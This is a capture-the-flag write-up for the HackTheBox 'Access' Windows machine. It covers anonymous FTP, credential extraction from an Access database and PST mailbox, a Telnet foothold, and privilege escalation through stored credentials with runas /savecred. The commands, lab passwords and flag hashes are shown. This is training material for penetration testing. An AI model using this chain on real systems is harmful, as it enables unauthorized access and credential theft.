# Access | HackTheBox Writeup

**OS:** Windows 7 | **Difficulty:** Easy | **Rooted:** 2026-06-12

**Techniques:** FTP anonymous access, MDB credential extraction, PST email analysis, Telnet foothold, runas stored credentials

---

## Overview

Access is an Easy Windows box that chains credential extraction across three file formats. Anonymous FTP exposes a Microsoft Access database and a password-protected zip archive. The database contains the zip password. The zip contains an Outlook PST file. The PST contains Telnet credentials for the security account. Once inside, stored Windows credentials for the Administrator account allow arbitrary command execution via runas without needing the password.

---

## Enumeration

### Port Scan

```bash
nmap -p- --min-rate 1000 -oN access-all-ports.txt 10.129.14.79
ports=$(grep open access-all-ports.txt | cut -d '/' -f1 | tr '\n' ',' | sed 's/,$//')
nmap -p $ports -sC -sV --min-rate 1000 -oN access-service-scan.txt 10.129.14.79
```

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | Microsoft ftpd (anonymous login) |
| 23 | Telnet | Windows 7 (build 6.1.7600) |
| 80 | HTTP | Microsoft IIS 7.5 |

### FTP Anonymous Access

```bash
ftp -A 10.129.14.79
```

Active mode required. PASV fails on this box.

| Directory | File |
|-----------|------|
| Backups | backup.mdb |
| Engineer | Access Control.zip |

Both downloaded in binary mode.

---

## Credential Chain

### Step 1: backup.mdb

```bash
mdb-tables backup.mdb
mdb-export backup.mdb auth_user
```

Found: `engineer` / `access4u@security`

### Step 2: Access Control.zip

```bash
7z x "Access Control.zip"
```

Password: `access4u@security`. Extracted: `Access Control.pst`

### Step 3: Access Control.pst

```bash
readpst "Access Control.pst"
cat "Access Control.mbox"
```

Email revealed: `security` / `4Cc3ssC0ntr0ller`

---

## Foothold

```bash
telnet 10.129.14.79
# login: security
# password: 4Cc3ssC0ntr0ller
```

```
type C:\Users\security\Desktop\user.txt
# fdf064b58eadd113911c771ffd0cd081
```

---

## Privilege Escalation

### Stored Credentials via runas

```
cmdkey /list
```

Administrator credentials stored on the machine.

```
runas /user:ACCESS\Administrator /savecred "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\security\Desktop\root.txt"
type C:\Users\security\Desktop\root.txt
# 8b5a78692eb4d29baf0a614b95627ba9
```

---

## Attack Chain

```
FTP anonymous: backup.mdb + Access Control.zip
    -> mdb-export auth_user: engineer/access4u@security
        -> 7z extract zip: Access Control.pst
            -> readpst: security/4Cc3ssC0ntr0ller
                -> Telnet shell as security
                    -> cmdkey /list: Administrator stored creds
                        -> runas /savecred: root.txt
```

---

## Key Takeaways

- FTP on Windows often requires active mode. Always try ftp -A when PASV fails.
- Switch to binary mode before downloading any non-text file. ASCII mode corrupts databases, zips, and executables.
- mdb-tables lists every table in an Access database. mdb-export dumps the contents. auth_user is always worth checking first.
- AES-encrypted zip archives require 7zip. Standard unzip silently skips them with an unsupported compression method error.
- PST files are high-value targets on Windows engagements. They contain full email history including credentials sent in plaintext.
- cmdkey /list is a mandatory post-foothold check on every Windows box. Stored credentials plus runas /savecred equals arbitrary command execution as the stored user.

---

*Part of the [oscp-journey](https://github.com/mavhezha/oscp-journey) repo. TJ Null HTB list, Windows Phase 2.*
